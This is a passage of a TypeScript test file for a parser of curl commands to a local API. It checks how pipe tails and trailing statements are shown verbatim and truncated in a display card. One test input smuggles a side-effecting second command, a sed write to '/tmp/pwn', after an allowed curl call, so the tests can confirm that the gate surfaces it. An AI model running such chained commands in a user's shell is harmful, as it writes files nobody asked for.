    }
  });

  // Same stance as the pipe-tail allowlist: a coarse command gate, not a purity
  // proof. What makes it honest is that the statement is shown verbatim.
  test("side-effecting args of allowed inspection commands parse, shown verbatim", () => {
    const req = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks; sed -e w/tmp/pwn /tmp/t.json",
    );
    expect(req).not.toBeNull();
    expect(req!.trailingCommand).toBe("; sed -e w/tmp/pwn /tmp/t.json");
  });

  // The pipe-tail property (see "displayed tail never shows less than the raw
  // collapsed row would"), pinned for the trailing statement: it is bounded
  // independently, and the raw row can never reach further into it.
  test("displayed trailing statement never shows less than the raw row would", () => {
    const longTrailing = `; jq '${"x".repeat(300)}' /tmp/t.json`;
    // No space before the `;`, so the raw slice reaches one character further
    // into the segment than it does for a pipe tail - still inside the bound.
    const rawShowsAfter = (prefix: string) =>
      Math.max(0, BASH_RAW_SUMMARY_CHARS - prefix.length);
    for (const prefix of [
      "curl localhost:4000",
      "curl -s localhost:4000/api/tasks",
    ]) {
      const req = parseIsomuxCurl(`${prefix}${longTrailing}`);
      expect(req).not.toBeNull();
      const shown = pipeTailForDisplay(req!.trailingCommand!).replace("…", "");
      expect(shown.length).toBeGreaterThanOrEqual(rawShowsAfter(prefix));
      expect(longTrailing.startsWith(shown)).toBe(true);
    }

    // Both segments at once, in the order the header renders them. The bounds
    // are independent, which is sound because the raw row's window is
    // contiguous and each segment's shown prefix already outruns it - but the
    // combined case is what the renderer actually wires up, so pin it.
    const command = `curl -s localhost:4000/api/tasks | head -c 100; echo ${"y".repeat(300)}`;
    const both = parseIsomuxCurl(command);
    expect(both).not.toBeNull();
    expect(both!.pipeTail).toBe("| head -c 100");
    expect(both!.trailingCommand).toStartWith("; echo yyy");
    const rawRow = command.slice(0, BASH_RAW_SUMMARY_CHARS);
    for (const segment of [both!.pipeTail!, both!.trailingCommand!]) {
      // What the raw collapsed row reveals of this segment ("" once the row
      // has run out) must be a prefix of what the card shows for it.
      const at = command.indexOf(segment);
      const rawPart = rawRow.slice(at, at + segment.length);
      const shown = pipeTailForDisplay(segment).replace("…", "");
      expect(shown).toStartWith(rawPart);
    }
  });
});
